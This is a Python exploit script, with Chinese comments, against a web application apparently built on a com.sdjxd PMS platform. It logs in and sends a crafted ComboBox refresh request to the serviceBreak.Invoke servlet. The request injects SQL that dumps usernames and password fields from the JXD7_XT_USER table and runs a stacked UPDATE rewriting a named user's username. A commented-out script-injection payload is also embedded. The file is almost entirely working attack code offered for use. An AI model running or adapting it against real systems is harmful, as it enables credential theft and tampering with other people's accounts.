#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2017/12/20 下午2:46
# @Author  : Anchor
# @File    : hussar.py
# @Des     : 注入利用

import requests
import base64
import hashlib

# host
Host = '192.168.2.239:8022'
# 设置代理
# proxies = {
#     'https': 'https://127.0.0.1:56948',
#     'http': 'http://127.0.0.1:56948'
# }
# 构造请求头部
headers = {
    'Host': Host,
    'Referer': 'http://'+Host+'/login.do',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
}

# 使用登录cookie信息
session = requests.session()

# MD5加密
def md5(password):
    m = hashlib.md5()
    m.update(password.encode("utf-8"))
    return m.hexdigest()

# 要注入的sql
parame = '1111'#r'</p><script>alert("hello world")</script><p>'
SQL = 'UPDATE JXD7_XT_USER SET USERNAME = '+parame+' WHERE USERCODE = \'王宾宾\' ;'


# 登录
def login(username,password):
    # 登录地址
    post_url = 'http://'+Host+'/servlet/com.sdjxd.pms.platform.serviceBreak.Invoke'
    # 登录参数
    Login_Data = {
        '_c': 'com.sdjxd.pms.platform.organize.User',
        '_m': 'loginByEncode',
        '_p0': bytes.decode(username),
        '_p1': password
    }
    login_page = session.post(post_url,data=Login_Data,headers=headers)
    print(login_page.text)
    login_code = login_page.status_code
    if login_code == 200:
        print('登录成功')
        sqlIntect(session)
    else:
        print('登录失败')

# 注入
def sqlIntect(session):
    JOBNUMBER = 'JXD-00683'
    # 注入点
    inject_url = 'http://'+Host+'/servlet/com.sdjxd.pms.platform.serviceBreak.Invoke?p=6962531A-0F5E-43E9-84ED-185AE9A93CFE'
    # 注入参数
    inject_Data = {
        '_c': 'com.sdjxd.pms.platform.form.service.cell.ComboBox',
        '_m': 'refresh',
        '_p0': '\"defaultds\"',
        '_p1': '\"[\"2\",[\"JXD7_XT_USER\",\"\'#\'+JOBNUMBER+\'@\'+USERNAME+\'@\'+PASSWD+\'@\'+XB+\'@\'+USERID+\'@\'+DEPTID+\'#\'\",\"\'efficacious\'\",\" WHERE 1=1 ;\''+SQL+'\'\"],\"0\",\"0\",\"0\",\"1\"]"',
        '_p2': '\"6962531A-0F5E-43E9-84ED-185AE9A93CFE\"',
        '_p3': '77'
    }
    page = session.post(inject_url, data=inject_Data, headers=headers)
    print(page.text)


if __name__ == '__main__':
    login(base64.b64encode('1111'.encode(encoding="gbk")),md5('888888'))